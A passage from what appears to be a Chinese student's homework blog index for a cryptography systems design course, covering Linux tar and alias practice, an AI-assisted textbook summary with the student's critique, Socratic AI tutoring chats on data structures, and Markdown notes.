newfile 的文件添加到已存在的名为 archive.tar 的归档文件中。 $ tar -rvf flag.tar file.txt file.txt $ tar -tvf flag.tar -rw-r--r-- zhanhe/zhanhe 20 2024-09-10 12:25 flag -rw-r--r-- zhanhe/zhanhe 17 2024-09-10 17:55 flag1 -rw-r--r-- zhanhe/zhanhe 23 2024-09-10 17:56 flag2 -rw-r--r-- zhanhe/zhanhe 1 2024-09-10 17:51 file.txt 6、创建一个经过 gzip 压缩的归档文件：打包 directory 目录下的所有文件和子目录，并使用 gzip 压缩，生成名为 archive.tar.gz 的归档文件。 $ tar -zcvf archive.tar.gz test test/ test/flag1 test/flag2 $ ls GmSSL-master archive.tar.gz file.txt flag flag.tar py snap testalias\r1.创建一个简单的alias $ alias cf='cat /flag' $ cf flag{th1s_1s_n2t_f1ag} 2.创建一个包含选项的alias $ alias la='ls -a' $ la . .bash_logout .config .java .motd_shown .sage GmSSL-master flag snap .. .bashrc .gdbinit .lesshst .profile .sudo_as_admin_successful archive.tar.gz flag.tar test .bash_history .cache .gitconfig .local .pycharm_helpers .viminfo file.txt py 3.创建一个包含多个命令的alias $ alias update='sudo apt update \u0026\u0026 sudo apt upgrade' $ update 4.查看所有的alias $ alias alias alert='notify-send --urgency=low -i \"$([ $? = 0 ] \u0026\u0026 echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;\u0026|]\\s*alert$//'\\'')\"' alias cf='cat /flag' alias egrep='egrep --color=auto' alias fgrep='fgrep --color=auto' alias grep='grep --color=auto' alias l='ls -CF' alias la='ls -A' alias ll='ls -alF' alias ls='ls --color=auto' 5.删除一个alias $ unalias cf $ alias alias alert='notify-send --urgency=low -i \"$([ $? = 0 ] \u0026\u0026 echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;\u0026|]\\s*alert$//'\\'')\"' alias egrep='egrep --color=auto' alias fgrep='fgrep --color=auto' alias grep='grep --color=auto' alias l='ls -CF' alias la='ls -A' alias ll='ls -alF' alias ls='ls --color=auto'","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:2:3","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"总结\r本次实践从重复老师上课教学内容开始到借助AI自主学习新的指令。显然，通过AI工具进一步扩展学习，进一步巩固所学知识，在平时学习中也要进一步掌握结合AI的能力，让AI辅助学习，减少重复而琐碎的行为，让注意力更加聚焦在关键的知识点。 ","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:2:4","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"作业提交要求 (1')\r记录实践过程和 AI 问答过程，尽量不要截图，给出文本内容 (选做)推荐所有作业托管到 gitee或 github 上 (必做)提交作业 markdown文档，命名为“学号-姓名-作业题目.md” (必做)提交作业 markdown文档转成的 PDF 文件，命名为“学号-姓名-作业题目.pdf” ","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:3:0","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"第一周预习报告\r","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:0:0","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习内容\r《Windows C/C++加密解密实战》第 1，2 章 第⼀章概念复习 第⼆章主要在 Linux（Ubuntu,openEuler）上把软件更新到最新版(3.0版本以上) ","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:0","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"软件安装成果：\ropeneuler系统:\rubuntu系统:\r","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:1","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"AI对学习内容的总结\r要求\r让AI（kimi，元宝等）阅读学习内容并进⾏总结，教材内容可以使⽤微信读书或者云班课电⼦教材 总结\r## 第一章：密码学概述 ### 密码学的定义与重要性： - 密码学是一门研究信息加密和解密技术的学科，主要用于保护数据的机密性、完整性、真实性以及不可否认性。它在信息安全中起着至关重要的作用。 ### 密码学的发展历史： - 古典密码学：以替换密码和置换密码为主，如凯撒密码、维吉尼亚密码等。这些方法简单但易于被破译。 - 现代密码学：以数学为基础，发展出了对称加密、非对称加密、杂凑函数、数字签名等复杂算法，大幅提高了信息安全性。 ### 现代密码学的主要技术： - 对称加密算法：如DES、AES等，使用相同的密钥进行加密和解密，速度快，适用于大数据量的加密。 - 非对称加密算法：如RSA、ECC等，使用一对密钥（公钥和私钥），安全性高，但计算复杂度较大。 - 杂凑函数：如MD5、SHA系列，用于生成数据的唯一固定长度摘要，确保数据的完整性。 - 数字签名：基于非对称加密技术，用于验证信息的来源和完整性，防止信息被篡改。 ### 密码学的应用领域： - 数据传输保护：如SSL/TLS协议用于保护互联网通信的安全。 - 电子商务与电子支付：通过加密和数字签名技术，保障在线交易的安全。 - 身份认证：如PKI体系，通过数字证书验证用户身份，防止身份盗用。 ## 第二章：搭建C和C++密码开发环境 ### 开发环境的选择与安装： - Windows平台：推荐使用Visual Studio作为开发环境，因其集成度高，支持C和C++语言，且兼容性好。 - 工具链的安装与配置：详细讲解了如何安装Visual Studio，并进行必要的设置，如选择安装必要的组件（C++桌面开发、Windows SDK等）。 ### 密码学库的集成： - OpenSSL：作为最广泛使用的开源密码库之一，介绍了如何下载、编译、配置OpenSSL，使其能够在C/C++项目中使用。 - CryptoAPI：Windows原生的密码学API，适用于在Windows平台上开发需要高安全性和可靠性保障的应用。讲解了如何在项目中调用CryptoAPI，配置项目的链接器和库路径。 ### 配置与调试技巧： - 环境变量设置：解释了如何配置系统环境变量，以便顺利调用密码库的函数。 - 调试方法：强调了在使用密码学库时常见的调试问题和解决方案，如动态库加载失败、函数调用错误等，并提供了一些调试的实用技巧。 ### 示例代码与实战练习： - 提供了若干示例代码，包括简单的加密、解密程序，帮助学生理解如何利用配置好的开发环境进行密码学的实际编程。 - 示例项目涵盖了对称加密、非对称加密、数据签名与验证的基本操作，旨在通过实践提升学生对密码技术的掌握。","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:2","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"对AI总结的反思与补充\r要求\rAI总结的问题 自己的补充 反思与补充\r反思\rAI总结会出现一些没有概括到的地方，比如第一章中1.1没有被提及、1.3密码学的基本概念只有加密算法的分类被提及；第二章没有概括到GmSSL。 AI总结并没有按照书中的子标题进行概括，同时AI的概括会出现书中不存在的内容比如概括中出现了密码学的应用领域；示例代码与实战练习与书中内容不符，书中大部分是测试代码，加解密代码仅有使用Crypto++进行AES加解密。 不能完全依靠AI总结，应该在自己先通读一遍了解大概内容后再根据AI总结对需要学习的部分进行精读。 补充\r第一章1.1部分通过介绍玛丽女王的故事来向读者阐述密码学的重要性 第一章1.3部分介绍密码学的基本概念 简要介绍了密码学的概念，密码学作为数学的一个分支，是研究信息系统安全保密的科学，是密码编码学和密码分析学的统称。 介绍了密码学要解决的五大问题：机密性、可用性、完整性、认证性、不可否认性 介绍了密码学中的五元组（明文、密文、密钥、加密算法、解密算法） 第二章2.4部分介绍了国产密码开发库GmSSL GmSSL的特点、历史 Windows环境下编译安装GmSSL Linux环境下编译安装GmSSL 验证GmSSL ","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:3","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习思维导图\r要求\rMermaid 代码与截图(参考Mermaid MindMap语法)或者提交思维导图链接（如果使用线上编辑器，推荐processon,xmind,…） 思维导图\r代码: mindmap root((密码系统设计第一周)) 教材 第一章 密码学的概念 密码学发展简史 密码学要解决的5大问题 密码学中的五元组 加解密算法的分类 对称算法 非对称算法 第二章 openssl crypto++ gmssl 课件 网络空间安全 密码与密码系统 法律法规与标准 密码应用与密评 实践 github 代码托管 博客发布 openssl gmsslmindmap\rroot((密码系统设计第一周))\r教材\r第一章\r密码学的概念\r密码学发展简史\r密码学要解决的5大问题\r密码学中的五元组\r加解密算法的分类\r对称算法\r非对称算法\r第二章\ropenssl\rcrypto++\rgmssl\r课件\r网络空间安全\r密码与密码系统\r法律法规与标准\r密码应用与密评 实践\rgithub\r代码托管\r博客发布\ropenssl\rgmssl\rmindmap\rroot((密码系统设计第一周))\r教材\r第一章\r密码学的概念\r密码学发展简史\r密码学要解决的5大问题\r密码学中的五元组\r加解密算法的分类\r对称算法\r非对称算法\r第二章\ropenssl\rcrypto++\rgmssl\r课件\r网络空间安全\r密码与密码系统\r法律法规与标准\r密码应用与密评 实践\rgithub\r代码托管\r博客发布\ropenssl\rgmssl","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:4","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"基于AI的学习\r要求\r至少找到自己理解不是太好2个概念，让AI对自己进行苏格拉底提问 参考下面提示词或者使用AI Agent 提示词：“我在学习XXX知识点，请你以苏格拉底的方式对我进行提问，一次一个问题”\r1. 核心是要求AI工具：“请你以苏格拉底的方式对我进行提问”\r2. 然后AI工具就会给你提问，如果不知道问题的答案，可以反问AI：“你的理解（回答）是什么？”\r3. 如果你觉得差不多了，可以先问问AI工具：“针对我XXX知识点，我理解了吗？”\r4. AI工具会给出它的判断，如果你也觉得自己想清楚了，可以最后问AI工具：“我的回答结束了，请对我的回答进行评价总结”，让它帮你总结一下。学习内容\r1. Human:我在学习可持久化线段树知识点，请你以苏格拉底的方式对我进行提问，一次一个问题 AI:好的，我们可以开始了。首先，什么是可持久化线段树？ Human:可持久化线段树是一种数据结构，通常用于解决可差性问题和版本更新问题，例如通过使用可持久化线段树可以解决区间第K大问题 AI:很好的解释。接下来，请问可持久化线段树是如何实现数据的版本管理和区间查询的？ Human:在版本管理上，首先先复制需要修改的版本，在这个副本上进行修改，通常会优化修改，每次只修改需要修改的一条链，而不是修改整个版本；区间查询需要针对具体问题进行编码，一般在可差性问题中，会使用权值树上二分的方式来进行区间查询同时使用前缀和进行优化 AI:你对可持久化线段树的实现细节描述得很清楚。那么，为什么在实际应用中，我们要使用可持久化线段树而不是普通的线段树？它带来了哪些具体的好处？ Human:可以解决线段树无法解决的问题，好处是时间复杂度足够优秀。我的回答不全面 AI:理解了。除了时间复杂度之外，可持久化线段树在解决实际问题时还有哪些优势或特点，使它成为一个有价值的工具？ Human:你的回答是 AI:可持久化线段树的主要优势包括： 1. 版本控制：它允许在多版本的数据中进行查询和更新，而无需重新构建整个数据结构。每个版本都能独立地进行操作和查询，便于历史数据的回溯和对比。 2. 空间效率：虽然它可能需要额外的空间来存储不同版本的数据，但每个版本只保存了修改部分而不是全部数据，通常会比重建整个数据结构更加高效。 3. 灵活性：它支持对数据的动态更新和查询，适用于需要频繁修改和查询的场景，如动态的游戏状态、不断变化的历史记录等。 4. 支持复杂查询：它能够处理比传统线段树更复杂的查询问题，例如区间第K大元素，支持的查询和更新类型更广泛。 这种数据结构在解决需要多版本管理和高效查询的问题时非常有用。 Human:下一个问题 AI:好的，下一个问题是：在实现可持久化线段树时，如何保证对旧版本数据的操作不会影响到新版本的数据？ Human:动态开点，每次只添加需要修改的那一条链，增加的点是logn个 AI:对的，动态开点是一个有效的优化方法。那么，具体来说，如何在实现中保证对每个版本的更新操作是高效且正确的？ Human:是什么 AI: 在实现可持久化线段树时，确保每个版本的更新操作高效且正确通常涉及以下几个关键点： 1. 惰性更新：为了减少不必要的更新，使用惰性标记来推迟某些操作的实际执行，直到真正需要时才进行。这可以减少重复计算和存储开销。 2. 路径压缩：在更新过程中，通过路径压缩技术优化树的结构，使得树的深度保持在对数级别，从而加速更新和查询操作。 3. 节点共享：在创建新版本时，共享未修改的节点。这意味着只有被修改的部分会创建新节点，而未修改的部分则重用已有节点，从而节省空间。 4.内存管理：合理管理内存分配和回收，避免过度的内存使用。例如，使用内存池技术来优化内存分配和释放的效率。 这些策略可以有效地提高可持久化线段树的性能，同时保证其操作的正确性和稳定性。 Human:下一个问题 AI:好的，下一个问题是：在使用可持久化线段树解决区间查询问题时，如何处理不同版本中的数据一致性，以确保查询结果的准确性？ Human:新的版本是基于旧版本上建立的，新增加一条链 AI:对，新的版本基于旧版本建立，并且只在需要修改的部分创建新的节点或链，以此保持数据的一致性。为了确保查询结果的准确性，我们还需要考虑以下几点： 1. 链的正确性：确保新增加的链在每个版本中都正确地反映了修改后的数据状态。这包括在查询时能够准确访问到正确的链。 2. 版本切换：在执行查询操作时，确保能够正确切换到相应的版本，并从正确的版本中读取数据。需要保证版本间的数据一致性，以便查询返回准确的结果。 3. 版本之间的共享：在新版本中共享旧版本未修改的部分，减少冗余存储和计算，同时确保新版本的查询操作能够正确访问到这些共享的数据。 这样处理可以确保在查询不同版本的数据时，结果是准确的，并且操作的效率得到了优化。 Human:针对我可持久化线段树知识点，我理解了吗 AI:从我们的对话来看，你对可持久化线段树的理解已经非常到位了。你清楚地掌握了它的基本概念、优势、版本管理方法、优化策略，以及如何在实际应用中保持数据的一致性。如果有任何不清楚的地方或需要进一步深入探讨的点，随时告诉我，我们可以继续讨论！2. Human:我在学习AC自动机知识点，请你以苏格拉底的方式对我进行提问，一次一个问题 AI:好的，我们开始吧。首先，AC自动机是什么，它主要用于解决什么问题？ Human:AC自动机是一种用于处理多字符串匹配的算法 AI:对的。接下来，请问AC自动机是如何构建和使用的？它的基本结构和工作原理是什么？ Human:通过字典树构建，使用模式串构建字典树，然后文本串进行匹配。文本串通过字典树去与模式串匹配，当失配时通过fail指针实现在字典树上的转移。当匹配到的节点有模式串结束标志时，说明文本串匹配到了一个模式串 AI:解释得很好。接下来，请问在构建AC自动机时，如何构建fail指针，它的作用是什么？ Human:Fail指针，也称失配指针，通常通过BFS进行构建，Fail指针指向其父亲的适配指针指向节点的子节点，该子节点与当前节点的字符相同 AI:对的，fail指针是AC自动机的关键部分。它的作用是： 1. 失败时跳转：在匹配过程中，当遇到不匹配时，fail指针帮助我们跳转到一个新的位置，继续尝试匹配，从而避免了从头开始重新匹配。 2. 提高效率：通过fail指针，算法能够在失配时迅速回溯并调整匹配位置，显著提高了多模式串匹配的效率。 接下来的问题是：如何在AC自动机中处理模式串的终止标志，以便在匹配时能够正确识别匹配的模式串？ Human:例如多模式串匹配 AI:没错，多模式串匹配是AC自动机的主要应用场景之一。其他常见的应用场景包括： 1. 文本检索：例如在搜索引擎中，用于查找多个关键词在文本中的位置。 2. 垃圾邮件过滤：用于检测和过滤含有多个特定模式的垃圾邮件。 3. 网络入侵检测：用于检测网络流量中是否包含已知的攻击模式或恶意代码。 4. 生物信息学：用于寻找生物序列中是否包含多个特定的基因序列。 这些应用都利用了AC自动机在处理多个模式串匹配时的高效性。 AI:好的，下一个问题是：在AC自动机中，如何处理多个模式串具有相同前缀的情况？如何利用这种结构优化匹配过程？ Human:字典树解决 AI:对，字典树（Trie）是处理具有相同前缀的模式串的关键数据结构。通过字典树，多个模式串共享相同的前缀部分，只在字典树中存储一次，从而节省了空间并提高了匹配效率。 这种结构优化匹配过程的方式包括： 1. 共享前缀：将具有相同前缀的模式串合并到字典树的同一条路径上，避免重复存储相同的前缀部分。 2. 节点复用：字典树的节点被复用于存储多个模式串的公共部分，从而减少了冗余节点的创建，节省了内存。 3. 加速匹配：通过字典树的结构，能够快速地找到和匹配模式串的前缀，减少了匹配过程中不必要的比较操作。 接下来的问题是：在构建AC自动机时，如何处理动态插入和删除模式串的需求？ Human:你的回答是 AI：在构建AC自动机时，处理动态插入和删除模式串的需求可以考虑以下策略： 1. 动态插入： - 插入新模式串：将新的模式串插入到现有的字典树中。更新字典树的结构并在需要的节点上设置终止标志。 - 更新fail指针：在插入新的模式串后，需要重新计算和更新涉及到的新节点的fail指针。通常，可以通过BFS来更新fail指针，以确保所有的失败链接都正确。 2. 动态删除： - 删除模式串：从字典树中删除特定的模式串。需要遍历字典树，找到模式串的终止标志并移除相关节点。如果节点不再需要（即没有其他模式串共享该节点），则删除这些节点。 - 更新fail指针：在删除模式串后，可能需要调整相关节点的fail指针，以确保AC自动机在匹配过程中的正确性。 动态插入和删除模式串需要在维护字典树结构的同时，确保fail指针的准确性，以保持AC自动机的高效性和正确性。 Human:针对我AC自动机知识点，我理解了吗 AI：从我们的讨论来看，你对AC自动机的理解很扎实。你掌握了它的基本概念、构建过程、fail指针的作用、处理相同前缀的优化方式以及如何动态插入和删除模式串的策略。如果有任何具体的细节或进一步的问题需要探讨，请随时告诉我，我们可以继续深入讨论！","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:5","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习实践过程遇到的问题与解决方式（AI 驱动，优先使用AI工具解决问题）\r安装GmSSL过程中遇到CMake报错：CMake Error:cmake_symlink_library:system error: operation not supported 原因：当前目录在共享文件夹中，无法创建链接 解决方法：将项目文件迁移到linux本地目录，再执行命令即可 ","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:6","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"作业提交要求\r提交Markdown文件,文档命名“学号姓名《密码系统设计》.md” . 提交Markdown文件转为 PDF,文档命名“学号姓名《密码系统设计》第 X 周.pdf” 提交代码托管链接（可选）：学号姓名 gitee(github) 链接 内容质量高有加分 参考链接： AI工具 ChatGPT 图书 《Window C/C++加密解密实战》 网站 openEuler基础（五）给openEuler虚拟机添加VMware-tools_openeuler安装vmwaretools-CSDN博客 openEuler基础（十七）虚拟机中openEuler与win10共享文件_openeuler共享文件-CSDN博客 Centos （openEuler）下快速安装cmake 2.8.12.2及cmake-gui - Frank_Jin - 博客园 (cnblogs.com) guanzhi/GmSSL: 支持国密SM2/SM3/SM4/SM9/SSL的密码工具箱 (github.com) [解决 cmake_symlink_library: System Error: Operation not supported_symlink 函数 function not implemented-CSDN博客](https://blog.csdn.net/aflyeaglenku/article/details/50697219#:~:text=背景 在centos) Ubuntu20.04与22.04 OpenSSL与OpenSSH编译安装_ubuntu openssl-CSDN博客 ","date":"2024-09-04","objectID":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:7","tags":[null],"title":"第一周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"任务详情\rAI工具如ChatGPT可以以多种方式助力学习，以下是一些主要的应用：\r- 个性化学习体验：AI可以根据学生的学习习惯、进度和兴趣提供个性化的学习材料和建议。\r- 语言学习辅助：AI可以提供语言练习，包括语法、发音、词汇和对话实践，帮助学生提高语言技能。\r- 写作辅导：AI可以帮助学生改进写作，提供语法检查、风格建议和内容反馈。\r- 问题解答：AI可以快速回答学生在学习过程中遇到的各种问题，提供解释和示例。\r- 课程内容的深度学习：AI可以提供额外的解释、示例和练习，帮助学生深入理解复杂概念。\r- 学习资源推荐：AI可以根据学生的学习进度和兴趣推荐相关的书籍、文章、视频和其他资源。\r- 模拟考试和练习：AI可以生成模拟考试和练习题，帮助学生准备考试。\r- 学习进度跟踪：AI可以帮助监控学生的学习进度，提供定期的进度报告和反馈。\r- 互动式学习：AI可以提供互动式学习体验，如通过聊天机器人进行对话练习或探索科学概念。\r- 辅助研究：AI可以帮助学生进行研究工作，提供文献搜索、资料整理和数据分析。\r- 情感支持：AI可以提供情感支持，鼓励学生在遇到困难时保持积极态度。\r......\r请回答：\r1. 你知道或使用过什么AI大模型平台？\r2. 如果有AI大模型平台助力学习的经历，举例说明AI如何提升你的学习效率的？例子越多越好，可以参考上面内容。\r3. 如果没有使用过AI平台，现在就启动吧，网上搜索一下，针对上面内容进行实践，提交实践过程。\r4. 思考AI如何助力你学好密码技术，密码系统设计与实现？","date":"2024-08-24","objectID":"/posts/homework/ai%E5%B7%A5%E5%85%B7/:1:0","tags":[null],"title":"1-0.AI工具(选做)","uri":"/posts/homework/ai%E5%B7%A5%E5%85%B7/"},{"categories":["homework"],"content":"作答\r# 1. 使用过chatgpt和文心一言 # 2. AI提升我的学习效率主要体现在： - 代码审计：在需要审计代码时，询问AI可以提升效率，特别是在审计反编译后的代码时； - 语法辅助：例如在使用不太熟练的语言、写项目时，询问AI语法问题可以减去搜索的实际，提升效率； - 问题解答：在遇到一些阐明观点、论述类的题目时，询问AI开阔思路； # 4. - 知识获取与整理：AI工具可以帮助生成结构化的笔记，自动标注重要信息，甚至提供文献的总结 - 代码纠错、安全评估与漏洞检测 - 设计实现方法分析","date":"2024-08-24","objectID":"/posts/homework/ai%E5%B7%A5%E5%85%B7/:2:0","tags":[null],"title":"1-0.AI工具(选做)","uri":"/posts/homework/ai%E5%B7%A5%E5%85%B7/"},{"categories":["homework"],"content":"任务详情\r你熟悉Markdown格式吗？选择自己熟悉的AI平台，把下面的提示词发给ta:\r\"\"\"\r作为计算机技术专家、人工智能技术专家，网络空间安全专家，密码学专家，密码技术专家，请您：\r1. 深入浅出的讲解一下Mardown，Markdown的详细语法\r2. 推荐至少两款线上工具，至少两种线下工具\r3. 讲解Markdown的高级用法，包括插入数学公式、绘图、制作PPT，格式转换等\r4. 讲解Markdown在chatgpt等AIGC的提示词工程中的应用\r\"\"\"\r学习、实践AI平台返回的内容，并回答：\r1.哪些内容是你掌握的？哪些内容是你没有掌握的？使用AI推荐的工具或者你喜欢的工具实践一下没有掌握的内容。\r2.要使用好AI工具，写好prompt(提示词)是非常重要的，提示词至少要有角色、上下文、任务。专家们提供了很多结构化提示词的框架，比如ICDO，BROKE，CRISP等，你知道哪些提示词框架？如果不知道，通过搜索工具或者AI工具学习一个。Markdown是结构化prompt的好方法，请为你学习的prompt框架使用Markdown格式设计一个通用模板\r3.作业提交要求使用Markdown格式，同时提交Markdown转化的PDF，推荐在https://www.cnblogs.com/或https://www.csdn.net/等技术平台发表博客，提交博客链接。或者在https://github.com/或https://gitee.com/等代码托管平台完成任务，提交文档链接","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:1:0","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["homework"],"content":"AI平台返回的内容：\r","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:2:0","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["homework"],"content":"1. 什么是Markdown？\rMarkdown是一种轻量级标记语言，旨在使文档的书写和阅读尽可能简单明了。它使用简洁的标记语法，可以轻松地将纯文本格式转换为格式丰富的文档，如HTML、PDF等。Markdown特别适合编写文档、笔记、博客等，因为它简洁直观，容易学习。 ","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:2:1","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["homework"],"content":"2. Markdown的详细语法\rMarkdown的基本语法包括以下几部分： 标题\r使用#表示标题，#的数量表示标题的层级，一级标题用一个#，二级标题用两个#，依此类推。 # 一级标题 ## 二级标题 ### 三级标题列表\r无序列表使用*、-或+加空格。 有序列表使用数字加点，例如 1. 。 - 无序列表项 * 另一项 + 第三项 1. 有序列表项 2. 另一项强调\r加粗：使用**或__包裹文本。 斜体：使用*或_包裹文本。 加粗斜体：组合使用***或___。 **加粗** *斜体* ***加粗斜体***引用\r使用\u003e表示引用。可以嵌套使用来创建多层引用。 \u003e 这是一个引用 \u003e\u003e 这是嵌套引用链接与图片\r链接使用 [显示文本](URL) 语法。 图片使用 ![替代文本](图片URL) 语法。 [这是一个链接](https://www.example.com) ![这是一个图片](https://www.example.com/image.png)代码块\r行内代码使用`包裹代码。 多行代码块使用三个反引号``` 包裹代码，并可指定语言。 `行内代码````python def hello(): print(“Hello, World!”) ``` #### 表格\r表格使用管道符`|`和连字符`-`来表示。\r```markdown\r| 表头1 | 表头2 |\r| ------ | ------ |\r| 单元格1 | 单元格2 |\r| 单元格3 | 单元格4 |","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:2:2","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["homework"],"content":"3. 推荐工具\r线上工具\rTypora：一个流行的Markdown编辑器，支持实时预览、插入图表、导出多种格式文档。 StackEdit：在线Markdown编辑器，支持云端存储和与各种服务同步。 线下工具\rVisual Studio Code (VS Code)：强大的代码编辑器，通过Markdown插件支持Markdown语法。 Mark Text：开源的Markdown编辑器，界面简洁，支持实时预览。 ","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:2:3","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["homework"],"content":"4. Markdown的高级用法\r插入数学公式\rMarkdown使用LaTeX语法来插入数学公式。行内公式使用$包裹，块级公式使用$$。 行内公式：$E = mc^2$ 块级公式： $$ \\frac{a}{b} = c $$绘图\r可以使用 Mermaid 绘制流程图、甘特图等。Mermaid支持多种图表类型，如流程图、序列图等。 ```mermaid graph TD; A--\u003eB; A--\u003eC; B--\u003eD; C--\u003eD; \\```制作PPT\r使用 Marp，一个基于Markdown的幻灯片工具，可以快速制作PPT。每个幻灯片用三个破折号---分隔。 # 幻灯片标题 --- ## 幻灯片2内容格式转换\rMarkdown文档可以通过工具如Pandoc转换为其他格式，如HTML、PDF、Word文档。 pandoc example.md -o example.pdf","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:2:4","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["homework"],"content":"5. Markdown在AIGC提示词工程中的应用\r在AIGC（人工智能生成内容）中，Markdown可以用于编写和格式化提示词。例如，在ChatGPT中使用Markdown编写带有格式的提示词，可以帮助模型更好地理解和生成结构化内容。通过使用标题、列表、代码块等语法，提示词可以更具条理性和可读性。 例如： # 提示词结构 1. **输入**：描述模型接收的输入。 2. **任务**：明确希望模型完成的任务。 3. **输出格式**：指定模型生成内容的格式（例如：JSON、表格、文本）。这种结构化的提示词有助于明确模型的行为，特别是在复杂任务中，确保输出的格式和内容符合预期。 ","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:2:5","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["homework"],"content":"作答：\r1. 掌握的内容：语法、数学公式、格式转化 未掌握的内容：绘图、制作PPT 实践： 使用markdown绘图： graph LR; A--\u003eB B--\u003eC C--\u003eD D--\u003eA\rgraph LR; A--\u003eB B--\u003eC C--\u003eD D--\u003eAgraph LR subgraph g1 a1*--\u003eb1* end subgraph g2 a2*--\u003eb2* end subgraph g3 a3*--\u003eb3* end a3*--\u003ea2*\rgraph LR subgraph g1 a1*--\u003eb1* end subgraph g2 a2*--\u003eb2* end subgraph g3 a3*--\u003eb3* end a3*--\u003ea2* 2. 未尝试过提示词框架 ICDO框架 🤖 Instruction (任务) ：你希望 AI 去做的任务，比如翻译或者写一段文字 📋 Context (背景) ：给 AI 